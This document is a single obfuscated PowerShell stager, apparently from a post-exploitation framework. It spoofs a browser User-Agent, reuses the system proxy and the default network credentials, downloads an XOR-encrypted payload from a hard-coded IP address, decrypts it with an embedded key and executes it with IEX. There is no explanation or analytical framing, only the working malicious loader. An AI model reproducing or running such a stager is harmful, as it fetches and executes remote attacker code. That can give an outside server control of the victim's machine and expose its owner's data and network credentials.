
$wc=NeW-OBjeCT SYsTem.Net.WEbClieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeadeRS.AdD('User-Agent',$u);$WC.PrOxy = [SySTEm.NET.WeBREqUeSt]::DEfAuLtWeBPrOXY;$wC.PrOxy.CredEnTiALs = [SYsTEM.NEt.CredenTiALCACHE]::DeFAUlTNETWORKCrEdENtiaLS;$K='m.]kjJd[SBY3&Le*<2xqzl6{Pr?s8)hC';$I=0;[chaR[]]$B=([cHaR[]]($WC.DOwNlOADStRing("http://222.230.139.166:80/index.asp")))|%{$_-bXor$K[$I++%$K.LENgTH]};IEX ($b-joiN'')

